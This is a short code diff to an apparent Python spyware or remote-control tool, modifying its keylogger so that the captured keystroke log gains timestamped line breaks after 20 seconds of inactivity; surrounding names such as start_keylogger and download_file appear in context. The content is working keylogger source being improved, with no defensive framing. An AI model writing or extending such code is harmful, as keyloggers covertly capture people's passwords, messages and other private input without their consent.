@@ -76,9 +76,12 @@ def download_file(file_name):
 
 log = ""
 keylogger_running = False
-
+t_start = time.time()  # Initialize the start time for the keylogger
 def on_press(key):
-    global log
+    global log, t_start
+    # if more than 20 seconds have passed since the last key press, add new line
+    if time.time() - t_start > 20:
+        log += f'\n[{time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())}] '
     try:
         # Append the pressed key to the log
         log += key.char
@@ -90,6 +93,7 @@ def on_press(key):
             log += '\n'
         else:
             log += f'[{key}]'
+    t_start = time.time()  # Update the start time after each key press
 
 def start_keylogger():
     global keylogger_running
